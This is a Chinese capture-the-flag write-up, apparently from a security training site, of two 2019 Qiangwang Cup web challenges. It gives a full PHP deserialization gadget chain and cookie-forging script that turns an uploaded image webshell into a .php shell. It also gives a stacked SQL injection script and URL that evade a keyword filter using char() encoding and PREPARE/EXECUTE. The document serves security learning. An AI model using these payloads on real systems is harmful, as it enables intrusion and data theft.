01题记

2019年的强网杯Web题目出的都不错，所以对题目进行分析一下！

02正文

upload

首先打开界面如下：

![0XiG46YxOu8](http://si1.go2yd.com/get-image/0XiG46YxOu8)

​

有注册和登录功能！

首先我们注册一个账户，然后登录，发现可以上传图片

![0XiG4NOIHvU](http://si1.go2yd.com/get-image/0XiG4NOIHvU)

​

![0XiG4MtNmqm](http://si1.go2yd.com/get-image/0XiG4MtNmqm)

​

这里首先想到的就是上传木马，但是经过尝试只能上传图片马，并且不能直接利用，经过抓包发现cookie是序列化内容，所以应该是通过cookie传递序列化内容，经过服务器的反序列化，然后对图片进行重命名操作，进而获得shell。

![0XiG4MyDFPU](http://si1.go2yd.com/get-image/0XiG4MyDFPU)

​

![0XiG4K9P3i4](http://si1.go2yd.com/get-image/0XiG4K9P3i4)

​

但是，这种操作是需要源码的，没有源码分析进行反序列化操作，是非常困难的，所以我们进行目录探测发现了
[www.tar.gz](http://www.tar.gz)，里面包含源码，并且存在.idea文件，所以直接用phpstorm打开发现断点，可能是出题人故意的吧，不过谁知道呢:)，分别是在
application/web/controller/Register.php 和 application/web/controller/Index.php

application/web/controller/Register.php

![0XiG4K4sF2u](http://si1.go2yd.com/get-image/0XiG4K4sF2u)

​

application/web/controller/Index.php

![0XiG4Ikc7vc](http://si1.go2yd.com/get-image/0XiG4Ikc7vc)

​

这两个断点给了我们的几点信息：

Register.php有一个析构方法，可知如果未登录网站进行访问的话，就会调用 index的 index()方法，而 index()方法是一个登录检测

![0XiG4HQE3wO](http://si1.go2yd.com/get-image/0XiG4HQE3wO)

​

index.php会对传入的 cookie先进行base64解码，然后对其进行反序列化操作，再把数据拿到数据库进行对比

仅有以上信息还是不够的，我们的目的是找到对文件名进行重赋值的方法，目前我们还做不到，所以继续审计，可以得到以下三个重要的文件

``

`web/controller/Index.php web/controller/Profile.php
web/controller/Register.php`

`public function upload_img(){ if($this->checker){
if(!$this->checker->login_check()){
$curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
$this->redirect($curr_url,302); exit(); } } if(!empty($_FILES)){
$this->filename_tmp=$_FILES['upload_file']['tmp_name'];
$this->filename=md5($_FILES['upload_file']['name']).".png";
$this->ext_check(); } if($this->ext) { if(getimagesize($this->filename_tmp)){
@copy($this->filename_tmp, $this->filename); @unlink($this->filename_tmp);
$this->img="../upload/$this->upload_menu/$this->filename";
$this->update_img();}else{ $this->error('Forbidden type!', url('../index'));}
} else{ $this->error('Unknow file type!', url('../index')); } }`

其中操作文件行为为

`if(getimagesize($this->filename_tmp)){ @copy($this->filename_tmp,
$this->filename); @unlink($this->filename_tmp);`

我们跟进 $this->filename_tmp和 $this->filename 发现并没限制，但是有一个阻碍

    
    
    if(!empty($_FILES)){ $this->filename_tmp=$_FILES['upload_file']['tmp_name']; $this->filename=md5($_FILES['upload_file']['name']).".png"; $this->ext_check(); }

我们需要绕过这里的判断，我们只需要使用GET请求即可绕过

`if($this->checker){ if(!$this->checker->login_check()){
$curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
$this->redirect($curr_url,302); exit(); } }`

上面的判读可以直接通过设置类中属性进行bypass，来绕过if判断

`public $checker=0; public
$filename_tmp="../public/upload/9c1534b1e8dbb5a0c0ec3f70d24f9627/0d44a7f4f1ae189a4c1d88b83f66ec68.png";
public
$filename="../public/upload/9c1534b1e8dbb5a0c0ec3f70d24f9627/ethan.php";`

文件路径通过以下代码获得

![0XiG4GzGN3Q](http://si1.go2yd.com/get-image/0XiG4GzGN3Q)

​

我们进入第三个if判断

当该值进入 upload_img函数后，接下来就可以利用 copy复制出php文件，但是问题是怎么通过反序列化直接调用 upload_img函数

这里我们要用到两个魔术方法

读取不可访问属性的值时，__get() 会被调用。

在对象中调用一个不可访问方法时，__call() 会被调用。

我们在以下代码中找到这两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。 get 会直接从 except 里找， call 会调用自身的
name 成员变量所指代的变量所指代的方法

``

`public function __get($name) { return $this->except[$name]; } public function
__call($name, $arguments) { if($this->{$name}){
$this->{$this->{$name}}($arguments); } }`

我们知道当对象调用不可访问属性时，就会自动触发 get魔法方法，而在对象调用不可访问函数时，就会自动触发 call魔法方法。 那么寻找触发方式可以发现文件
web/controller/Register.php，关键部分如下：

`class Register extends Controller { public $checker; public $registed; public
function __construct() { $this->checker=new Index(); } public function
__destruct() { if(!$this->registed){ $this->checker->index(); } } }`

我们可以看到checker调用了类Index里的方法index()，如果我们此时将checker的
destruct覆盖为类Profile，那么势必在调用index()方法时，会触发
call函数，因为check对象的index()方法是在Profile.php中不存在的

`public function __call($name, $arguments) { if($this->{$name}){
$this->{$this->{$name}}($arguments); } }`

而进入该函数后，我们会触发 $this->index,成功尝试调用类Profile中不存在的对象，于是可触发 __get魔法方法，从而变成
return$this->except['index'];，那么我们只要在构造序列化时，将 except赋值为数组，如下：

`public $except=array('index'=>'upload_img');`

即可在类Register进行 __destruct()时，成功触发 upload_img函数，进行文件复制和改名

以下是我们的攻击链：

`Register->__destruct Profile-> __call Profile-> __get Profile-> upload_img()`

流程图大概如下：

![0XiG4JJrHJw](http://si1.go2yd.com/get-image/0XiG4JJrHJw)

​

而我们只需要控制 __get的 except的值，就可以调用任意方法。

综上所述，我们构造以下代码

`<?php namespace app\web\controller; class Profile { public $checker=0; public
$filename_tmp="../public/upload/9c1534b1e8dbb5a0c0ec3f70d24f9627/0d44a7f4f1ae189a4c1d88b83f66ec68.png";
public
$filename="../public/upload/9c1534b1e8dbb5a0c0ec3f70d24f9627/ethan.php";
public $upload_menu; public $ext=1; public $img; public
$except=array('index'=>'upload_img'); } class Register { public $checker;
public $registed=0; } $a=new Register(); $a->checker=new Profile();
$a->checker->checker = 0; // echo serialize($a); echo
base64_encode(serialize($a)); ?>`

首先，我们上传一个图片马，然后利用我们得到的payload替换cookie，刷新后即可找到修改后缀后的php文件

![0XiG4FHPUSO](http://si1.go2yd.com/get-image/0XiG4FHPUSO)

​

![0XiG4DArSHQ](http://si1.go2yd.com/get-image/0XiG4DArSHQ)

​

使用蚁剑连接我们的木马，成功拿到shell

![0XiG4EP04n2](http://si1.go2yd.com/get-image/0XiG4EP04n2)

​

随便注

`return preg_match("/select|update|delete|drop|insert|where|\./i", $inject);`

![0XiG4Csrxdg](http://si1.go2yd.com/get-image/0XiG4Csrxdg)

​

这里过滤了 select和 .，所以跨表查询存在难度，因此这里使用堆叠注入和 char进行 bypass

exp如下：

`payload = "0';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;" #exp = 'select
group_concat(TABLE_NAME) from information_schema.TABLES where
TABLE_SCHEMA=database()' #exp = "select group_concat(COLUMN_NAME) from
information_schema.COLUMNS where TABLE_NAME='1919810931114514'" exp = "select
flag from `1919810931114514`" res = '' for i in exp: res +=
"char(%s),"%(ord(i)) my_payload = payload%(res[:-1]) print(my_payload)`

获取表名

<http://192.168.23.166:8888/?inject=0>';set
@s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE
a FROM @s;EXECUTE a;

![0XiG4EOJw5w](http://si1.go2yd.com/get-image/0XiG4EOJw5w)

​

![0XiG49nnWGu](http://si1.go2yd.com/get-image/0XiG49nnWGu)

​

![0XiG4AXVqPA](http://si1.go2yd.com/get-image/0XiG4AXVqPA)

​

![0XiG4A8cYuO](http://si1.go2yd.com/get-image/0XiG4A8cYuO)

​

![0XiG49SOs7M](http://si1.go2yd.com/get-image/0XiG49SOs7M)

​

相关实验

绕过内容检查实现文件上传：文件上传指将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端硬盘上作为真实的文件保存。了解文件上传漏洞产生的原因，掌握漏洞的利用方法。

[http://www.hetianlab.com/expc.do?w=exp_ass&ec=ECIDedb1-a2fa-4dc5-a8a8-cb4cb9d0abdd](http://www.hetianlab.com/expc.do?w=exp_ass&ec=ECIDedb1-a2fa-4dc5-a8a8-cb4cb9d0abdd)

![0XiG4OCLWj2](http://si1.go2yd.com/get-image/0XiG4OCLWj2)

​

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需转载，请注明出处！

